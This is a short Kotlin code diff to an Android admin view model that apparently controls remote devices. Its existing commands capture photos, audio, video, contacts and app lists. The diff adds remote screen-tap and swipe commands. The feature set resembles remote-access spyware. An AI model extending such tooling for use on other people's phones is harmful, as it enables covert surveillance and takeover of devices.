@@ -408,6 +408,8 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             "take_photo" -> "التقاط صورة كاميرا"
             "record_audio" -> "تسجيل صوتي"
             "get_contacts" -> "جلب جهات الاتصال"
+            "remote_click" -> "نقر على الشاشة"
+            "remote_swipe" -> "سحب على الشاشة"
             "record_video_front" -> "تسجيل فيديو (أمامي)"
             "record_video_back" -> "تسجيل فيديو (خلفي)"
             "list_apps" -> "جلب قائمة التطبيقات"
@@ -631,6 +633,22 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
 
     fun requestContacts() {
         runCommand("get_contacts")
+    }
+    
+    fun sendRemoteClick(x: Float, y: Float) {
+        val params = mapOf("x" to x.toString(), "y" to y.toString())
+        runCommand("remote_click", params)
+    }
+
+    fun sendRemoteSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300) {
+        val params = mapOf(
+            "x1" to x1.toString(),
+            "y1" to y1.toString(),
+            "x2" to x2.toString(),
+            "y2" to y2.toString(),
+            "duration" to duration.toString()
+        )
+        runCommand("remote_swipe", params)
     }
 
     fun requestAppsList() {
